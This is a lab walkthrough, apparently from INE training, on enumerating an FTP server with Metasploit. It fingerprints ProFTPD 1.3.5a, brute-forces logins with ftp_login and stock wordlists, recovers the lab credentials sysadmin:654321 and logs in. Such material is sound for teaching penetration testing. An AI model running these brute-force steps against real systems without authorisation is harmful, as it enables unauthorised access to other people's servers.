# FTP Enumeration

1. Check if the target machine is reachable:
   ```
   ping -c 4 demo.ine.local
   ```
   ![image](https://github.com/user-attachments/assets/71c0e66d-a731-4415-a435-a5a7edffe232)

   The target is reachable.

2. Start Metasploit using `msfconsole`. We need to identify a service version of the FTP server running on the target, this can be done by loading the following module:
   ```
   use auxiliary/scanner/ftp/ftp_version
   ```
   We will now need to configure the module options, more specifically, the target option, this can be done by running the following command:
   ```
   set RHOSTS demo.ine.local
   ```
   Then enter `run`

3. As shown in the following screenshot, the module reveals that the target system is running ProFTPD 1.3.5a
   ![image](https://github.com/user-attachments/assets/95d8110b-b253-434c-b3d5-c203b040ec9e)
   
4. We can perform a brute-force on the FTP server to identify legitimate credentials that we can use for authentication, this can be done by loading the ftp_login module as follows:
   ```
   use auxiliary/scanner/ftp/ftp_login
   ```
   We will now need to configure the module options, more specifically, the target option, this can be done by running the following command:
   ```
   set RHOSTS demo.ine.local
   ```
   Given that we are performing a brute force attack, we will also need to configure the USER_FILE and PASS_FILE options.
   ```
   set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
   set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
   ```
   Then run the module using `run`

5. As shown in the following screenshot, the brute force attack identifies the credentials sysadmin:654321
   ![image](https://github.com/user-attachments/assets/baeae2af-85b6-4f04-8c64-8b2ff229ef04)
   We can also check if anonymous logons are allowed on the FTP server, this can be done by using the following commands:
   ```
   use auxiliary/scanner/ftp/anonymous
   set RHOSTS demo.ine.local
   run
   ```
6. As shown in the following screenshot, the module reveals that anonymous FTP logons are not enabled on the FTP server.
   ![image](https://github.com/user-attachments/assets/75534d3a-e151-46d0-9433-5e6b25d07393)
   We can now login to the FTP server with the credentials we obtained from the FTP brute force, this can be done through the use of the FTP client on Kali Linux.
   ```
   ftp demo.ine.local
   ```
7. As shown in the following screenshot, you will be prompted to provide a username and password, supply the credentials we obtained from the brute force attack. Authentication is successful and we are logged in to the FTP server.
   ![image](https://github.com/user-attachments/assets/b116ec8c-2f1e-4448-b2ba-251e9c41db75)

   




